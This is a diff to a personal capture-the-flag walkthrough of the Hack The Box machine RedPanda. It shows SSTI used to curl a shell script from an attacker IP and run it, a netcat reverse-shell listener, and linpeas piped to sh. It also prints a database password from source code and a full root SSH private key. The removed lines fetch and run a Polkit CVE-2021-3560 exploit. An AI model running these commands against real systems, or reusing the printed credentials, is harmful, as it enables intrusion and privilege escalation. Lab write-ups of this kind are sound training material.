@@ -108,28 +108,51 @@ SSTI to upload script
 `command = "curl 10.10.ATTACKER.IP:8000/shell.sh --output /tmp/shell.sh"`
 
 Create netcat listener, then invoke uploaded shell script
-`nc -mvlp 9001`
+`nc -nvlp 9001`
 
 SSTI to invoke script
 `command = "bash /tmp/shell.sh"`
 
-# Try LinPEAS to find escalation
-[LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
+### Connected with reverse shell as woodenk
+Time for some basic enumeration on panda and woodenk
 ```
-# From github
+find / -name "*panda*" 2>/dev/null
+find / -name "*woodenk*" 2>/dev/null
+```
+
+This gives us a source code directory (maybe some nice config info) and user XML files in /credits
+```
+cd /opt/panda_search
+find . -type f -exec grep -H 'text-to-find-here' {} \;
+```
+
+result:
+`./src/main/java/com/panda_search/htb/panda_search/MainController.java:            conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");`
+
+
+**DEAD END** Try LinPEAS to find escalation, nothing I saw at the OS level
+From github to your attecking machine (HTB machines don't resolve WWW domains)
+```
 curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh
-scp linpeas.sh dwight@office.paper:linpeas.sh
+```
+On target machine upload linPEAS
+```
+curl -L http://10.10.14.2:8000/linpeas.sh | sh
 ```
 
-Running linpeas.sh shows vulnerables to  CVE-2021-3560
+ROOT requires XXE (Incomplete)
+https://shakuganz.com/2022/07/12/hackthebox-redpanda/
 
-```
-curl https://raw.githubusercontent.com/Almorabea/Polkit-exploit/main/CVE-2021-3560.py > exploit.py
-scp exploit.py dwight@paper.htb:.
-ssh dwight@paper.htb
-```
-```
-python3 exploit.py
-```
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
+ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
+AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
+RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
+-----END OPENSSH PRIVATE KEY-----
+
+chmod 600 ./le_key.txt
+ssh root@redpanda.htb -i le_key.txt
+
 
 ### ROOT SUCCESS!
